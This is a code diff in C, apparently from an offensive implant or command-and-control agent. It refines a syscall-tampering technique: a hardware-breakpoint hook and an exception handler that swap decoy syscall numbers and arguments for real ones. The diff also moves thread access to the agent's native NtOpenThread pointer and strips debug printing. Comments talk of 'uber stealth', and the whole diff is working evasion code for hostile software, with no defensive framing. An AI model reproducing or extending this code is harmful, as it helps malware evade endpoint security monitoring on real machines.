@@ -205,9 +205,13 @@ BOOL InstallHardwareBreakpointHook(_In_ DWORD dwThreadID, _In_ ULONG_PTR uTarget
     CONTEXT Context = {.ContextFlags = CONTEXT_DEBUG_REGISTERS};
     HANDLE hThread = NULL;
     BOOL bResult = FALSE;
+    NTSTATUS NtStatus = -1;
+    CLIENT_ID ClientID = {0};
+    ClientID.UniqueProcess = (HANDLE) NtCurrentProcess();
+    ClientID.UniqueThread = (HANDLE)dwThreadID;
 
     //TODO : use indirect syscalls and native functions for this for uber stealth.
-    if(!(hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadID))) {
+    if((NtStatus = agent->apis->pNtOpenThread(&hThread, THREAD_ALL_ACCESS, NULL, dwThreadID)) != 0x00) {
         goto _END_OF_FUNC;
     }
 
@@ -274,12 +278,6 @@ LONG ExceptionHandlerCallbackRoutine(IN PEXCEPTION_POINTERS pExceptionInfo) {
 
     EnterCriticalSection(&g_CriticalSection);
 
-    printf("[info ssn] : 0x%llu\n", (DWORD64)g_TamperedSyscall.dwSyscallNumber);
-    printf("[info param1] : 0x%llx\n", (DWORD64)g_TamperedSyscall.uParam1);
-    printf("[info param2] : 0x%llx\n", (DWORD64)g_TamperedSyscall.uParam2);
-    printf("[info param3] : 0x%llx\n", (DWORD64)g_TamperedSyscall.uParam3);
-    printf("[info param4] : 0x%llx\n", (DWORD64)g_TamperedSyscall.uParam4);
-
     //TODO : add support for 32bit processes.
     //Replace Decoy SSN
     pExceptionInfo->ContextRecord->Rax = (DWORD64)g_TamperedSyscall.dwSyscallNumber;
@@ -290,24 +288,10 @@ LONG ExceptionHandlerCallbackRoutine(IN PEXCEPTION_POINTERS pExceptionInfo) {
     pExceptionInfo->ContextRecord->R9 = (DWORD64)g_TamperedSyscall.uParam4;
 
     //stack content BEFORE the swap
-    printf("stack content before modification\n");
-    printf("[info] rsp : 0x%llx\n", pExceptionInfo->ContextRecord->Rsp);
-    printf("[info] RSP+8 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x08));
-    printf("[info] RSP+10 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x10));
-    printf("[info] RSP+18 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x18));
-    printf("[info] RSP+20 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x20));
-    printf("[info] RSP+28 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x28));
-    printf("[info] RSP+30 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x30));
-    printf("[info] RSP+38 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x38));
-    printf("[info] RSP+40 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x40));
-    printf("[info] RSP+48 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x48));
-    printf("[info] RSP+50 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x50));
-    printf("[info] RSP+58 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x58));
 
 
     // replace decoy parms on stack if needed.
     if(g_TamperedSyscall.Nargs > 4) {
-        printf("stack content after modification\n");
         *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x28) = (DWORD64)g_TamperedSyscall.uParam5;
         *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x30) = (DWORD64)g_TamperedSyscall.uParam6;
         *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x38) = (DWORD64)g_TamperedSyscall.uParam7;
@@ -315,19 +299,6 @@ LONG ExceptionHandlerCallbackRoutine(IN PEXCEPTION_POINTERS pExceptionInfo) {
         *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x48) = (DWORD64)g_TamperedSyscall.uParam9;
         *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x50) = (DWORD64)g_TamperedSyscall.uParamA;
         *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x58) = (DWORD64)g_TamperedSyscall.uParamB;
-
-        printf("[info] rsp : 0x%llx\n", pExceptionInfo->ContextRecord->Rsp);
-        printf("[info] RSP+8 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x08));
-        printf("[info] RSP+10 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x10));
-        printf("[info] RSP+18 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x18));
-        printf("[info] RSP+20 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x20));
-        printf("[info] RSP+28 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x28));
-        printf("[info] RSP+30 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x30));
-        printf("[info] RSP+38 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x38));
-        printf("[info] RSP+40 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x40));
-        printf("[info] RSP+48 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x48));
-        printf("[info] RSP+50 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x50));
-        printf("[info] RSP+58 : 0x%llx\n", *(unsigned long long*)(pExceptionInfo->ContextRecord->Rsp + 0x58));
     }
 
     //remove breakpoint
